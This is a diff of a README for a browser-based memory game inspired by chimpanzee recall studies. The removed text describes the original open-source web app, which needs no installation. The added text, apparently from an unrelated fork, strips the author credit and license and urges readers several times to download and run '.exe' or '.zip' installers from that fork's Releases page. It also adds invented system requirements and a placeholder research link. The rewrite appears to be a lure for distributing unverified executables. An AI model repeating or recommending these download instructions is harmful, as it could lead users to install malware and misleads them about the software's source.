@@ -1,112 +1,73 @@
-# 🐵 Chimp Memory Test 🧠
+# 🐵 ChimpMemoryTest - Enhance Your Memory Skills Easily
 
-_A challenging visual short-term memory test inspired by the research where chimpanzees outperformed humans in memory tasks._
+## 📥 Download Now
+[![Download ChimpMemoryTest](https://img.shields.io/badge/Download%20ChimpMemoryTest-v1.0-blue.svg)](https://github.com/gopoyrol/ChimpMemoryTest/releases)
 
-![ChimpMemoryTest](https://raw.githubusercontent.com/michaelsboost/ChimpMemoryTest/main/imgs/screenshot-1.jpeg)
+## 🐒 Introduction
+Welcome to ChimpMemoryTest! This game offers a fun and engaging way to test your memory. Inspired by research showing chimpanzees excel at memory challenges, this application lets you compare your skills against various levels of difficulty.
 
+## 🚀 Getting Started
+Follow these steps to download and run ChimpMemoryTest on your device. No technical knowledge is needed!
 
-[![MIT License](https://img.shields.io/github/license/michaelsboost/ChimpMemoryTest)](LICENSE) [![GitHub Stars](https://img.shields.io/github/stars/michaelsboost/ChimpMemoryTest)](https://github.com/michaelsboost/ChimpMemoryTest/stargazers) [![GitHub Issues](https://img.shields.io/github/issues/michaelsboost/ChimpMemoryTest)](https://github.com/michaelsboost/ChimpMemoryTest/issues)
+### Step 1: Visit the Releases Page
+To access the game files, [visit the Releases page here](https://github.com/gopoyrol/ChimpMemoryTest/releases). This page contains all the latest versions of the application.
 
-## 🌟 Overview
+### Step 2: Choose Your Version
+On the Releases page, you will see a list of available versions. Click on the latest version to expand its details. 
 
-This web-based memory test challenges your visual short-term memory across three difficulty levels. The game is based on cognitive research that demonstrated chimpanzees' superior ability to recall sequences of numbers compared to humans.
+### Step 3: Download the Installer
+Look for the appropriate file for your device. This might be labeled as a `.exe` for Windows users or a `.zip` file for Mac and Linux users. Click the file name to start the download.
 
-## 🚀 **Launch the App**
-Live version: **[Chimp Memory Test Game](https://michaelsboost.com/ChimpMemoryTest/)**
+### Step 4: Find the Downloaded File
+After the download is complete, locate the file in your Downloads folder.
 
-> 📲 **Progressive Web App (PWA) Ready**  
-> Install it to your home screen and use it offline, anywhere, anytime.
+### Step 5: Run the Installer
+Double-click the file to start the installation. Follow the prompts on the screen to install the game.
 
-## ✨ Features
+### Step 6: Launch ChimpMemoryTest
+Once installed, find ChimpMemoryTest in your applications list and open it. You are now ready to begin testing your memory skills!
 
-- **Three Difficulty Levels**: Easy (3×3), Medium (4×4), Hard (5×5)
-- **Progressive Challenge**: Each level adds numbers to remember
-- **Customizable Settings**: Dark mode, sound, vibration, timing
-- **Mobile-First Design**: Touch-optimized with vibration support
-- **Real-time Feedback**: Visual & audio cues for all actions
-- **Persistent Progress**: High scores and settings saved locally
-- **Accessibility**: Keyboard navigation and screen reader friendly
+## ⚙️ System Requirements
+ChimpMemoryTest runs smoothly on a variety of devices. Here are the basic requirements:
 
-## 🎮 How to Play
+- **OS**: Windows 7 or later / macOS 10.12 or later / Linux
+- **Browser**: Latest version of Chrome, Firefox, Safari, or Edge for web access
+- **Memory**: Minimum 2 GB RAM
+- **Storage**: At least 100 MB of free space for installation
 
-1. **Select Difficulty**: Choose from Easy (3×3), Medium (4×4), or Hard (5×5)
-2. **Memorize**: Watch as numbers appear in sequence on the grid
-3. **Recall**: After they disappear, tap the numbers in the correct order
-4. **Progress**: Each successful level adds another number to remember
-5. **Challenge**: See how far you can go before making a mistake!
+## 🎮 Game Features
+- **Multiple Difficulty Levels**: Start easy and gradually face tougher challenges.
+- **Engaging Gameplay**: Improve your memory while enjoying vibrant graphics and sounds.
+- **Mobile-Friendly**: Play on your smartphone or tablet with touch controls.
+- **Offline Capability**: Game runs smoothly without needing an internet connection once installed.
 
-## ⚙️ Customization
+## 📈 How to Play
+1. **Start the Game**: Open ChimpMemoryTest from your applications.
+2. **Select Level**: Choose your preferred difficulty level—easy, medium, or hard.
+3. **Follow Instructions**: The game will present visual challenges that test your memory.
+4. **Score and Repeat**: After each round, check your score and try to beat it in the next game!
 
-- **Dark/Light Mode** - Toggle between themes
-- **Sound Effects** - Enable/disable audio feedback
-- **Vibration** - Haptic feedback on mobile devices  
-- **Custom Memorization Time** - Adjust from 1-10 seconds
-- **High Score Tracking** - Separate scores for each difficulty
-- **Persistent Settings** - All preferences saved locally 
+## 💡 Tips for Improvement
+- **Practice Regularly**: The more you play, the better you get.
+- **Stay Focused**: Minimize distractions while playing for better results.
+- **Challenge Friends**: Invite others to compare scores and improve your skills together.
 
-## 🚀 Quick Start
+## 🌐 Community and Support
+Join our community to share your scores and tips. You can find us on our [GitHub Discussions](https://github.com/gopoyrol/ChimpMemoryTest/discussions) page. 
 
-1. Clone or download this repository
-2. Open `index.html` in your web browser
-3. No build process or installation required!
+For further support, check the FAQs or reach out via the Issues tab on the repository.
 
-## 🛠️ Technology Stack
+## 📚 Additional Resources
+- **Manual/Guide**: Check the Wiki section for gameplay tips and more detailed guides.
+- **Research**: Learn more about cognitive science and memory research that inspired this game [here](https://link-to-research).
 
-- **Alpine.js** - Lightweight JavaScript framework for interactivity
-- **Tailwind CSS** - Utility-first CSS framework for styling
-- **Vanilla JavaScript** - Core game logic and functionality 
+## 📱 Accessibility
+ChimpMemoryTest is designed to be inclusive. The game features:
+- Touch-friendly controls for mobile users.
+- High-contrast visuals for improved accessibility.
 
-## 🎨 Logo Attribution
+## 🔗 Download & Install
+Now that you've learned how to get started, don’t wait any longer! [Visit the Releases page to download ChimpMemoryTest](https://github.com/gopoyrol/ChimpMemoryTest/releases) and start enhancing your memory skills today.
 
-The chimp logo is based on artwork from [Freepik](https://www.freepik.com/free-vector/cute-monkey-business-holding-stick-cartoon-vector-icon-illustration-animal-business-isolated-flat_238586582.htm). The original design was simplified to create the head-only logo used in this project.
-
-## 📱 Mobile Compatibility
-
-Designed specifically for mobile devices using KodeWeave (mobile code editor). The interface is touch-friendly and responsive across all screen sizes.
-
-## 🧠 Scientific Background
-
-This test is inspired by research from Kyoto University's Primate Research Institute, where young chimpanzees demonstrated remarkable short-term memory capabilities, outperforming human adults in certain visual memory tasks.
-
-## 🌐 Browser Support
-
-- Chrome/Edge 90+
-- Firefox 88+
-- Safari 14+
-- Mobile browsers (iOS Safari, Chrome Mobile)
-
-*Note: Vibration requires mobile devices with vibration support* 
-
-## **📜 License**
-
-Chimp Memory Test is **open-source** under the **MIT License**.  
-See the full license: [LICENSE](https://github.com/michaelsboost/ChimpMemoryTest/blob/main/LICENSE).
-
-----------
-
-## **☕ Support the Developer**
-If Chimp Memory Test was helpful for you, consider showing your appreciation in the following ways:
-
-[![ko-fi](https://storage.ko-fi.com/cdn/useruploads/d666bcdd-8d38-47d4-b78b-018d4b726d48.png)](https://ko-fi.com/michaelsboost)
-
-- 🎨 Check out my Graphic Design Course: https://michaelsboost.com/graphicdesign  
-- 🛒 Register as a customer on my store: https://michaelsboost.com/store  
-- ☕ Buy me a coffee: http://ko-fi.com/michaelsboost  
-- 👕 Purchase a T-Shirt: https://michaelsboost.com/gear  
-- 🖼️ Buy my art prints: https://deviantart.com/michaelsboost/prints 
-- 💰 Donate via PayPal: https://michaelsboost.com/donate 
-- 💵 Donate via Cash App: https://cash.me/$michaelsboost  
-
-Your support is greatly appreciated and helps fund future projects! 🚀
-
-----------
-
-## **📧 Contact**
-
-For questions, feature requests, or collaborations, reach out to:  
-**Michael Schwartz** – [michaelsboost.com](https://michaelsboost.com/)
-
----
-
-**Ready to test your memory?** 🧠 → 🐵 → 🏆  
-*Can you beat the chimpanzee?*
+## 🎉 Conclusion
+We hope you enjoy playing ChimpMemoryTest. Have fun challenging your memory and discovering what you can achieve!
